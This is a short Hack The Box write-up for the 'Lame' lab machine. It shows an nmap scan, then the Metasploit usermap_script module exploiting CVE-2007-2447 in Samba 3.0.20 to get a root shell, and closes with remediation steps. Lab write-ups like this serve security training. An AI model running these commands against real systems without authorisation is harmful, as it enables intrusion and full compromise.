# Hack The Box: LAME  🚩

**Date:** 2025-12-08

**Attacker IP:** 10.10.14.13

**Target IP:** 10.10.10.3

**Difficulty:** Easy/Beginner

## 📝 Executive Summary
Lame is a beginner-level machine that demonstrates the risks of outdated services. It relies on a well-known vulnerability in **Samba 3.0.20**, allowing for Remote Code Execution (RCE) without prior credentials.

**Key Findings:**

- Port 21: ftp (vsftpd 2.3.4) - Potential backdoor, but not the primary path used.

- Port 139/445: netbios-ssn (Samba smbd 3.0.20-Debian) - VULNERABLE 🚨

---

## 🔍 1. Reconnaissance

### Nmap Scan
```
nmap -sC -sV -Pn 10.10.10.3
```
---

## 💥 2. Vulnerability Analysis

Service: Samba 3.0.20 Vulnerability: CVE-2007-2447 (Username Map Script) Type: Remote Command Execution (RCE)

The username map script option in smb.conf allows executing system commands via shell metacharacters in the username field.

---

## ⚔️ 3. Exploitation

Tool Used: Metasploit Framework

Selected the exploit module:
```
use exploit/multi/samba/usermap_script
```

Configured targets:

```
set RHOSTS 10.10.10.3
set LHOST 10.10.14.13
```

Executed:

```
exploit
```

Result: Instant Root Shell obtained. No privilege escalation was required as the Samba service runs as root.

---

## 🛡️ 4. Remediation

- Update Samba to the latest stable version.

- Remove username map script from smb.conf if not strictly necessary.
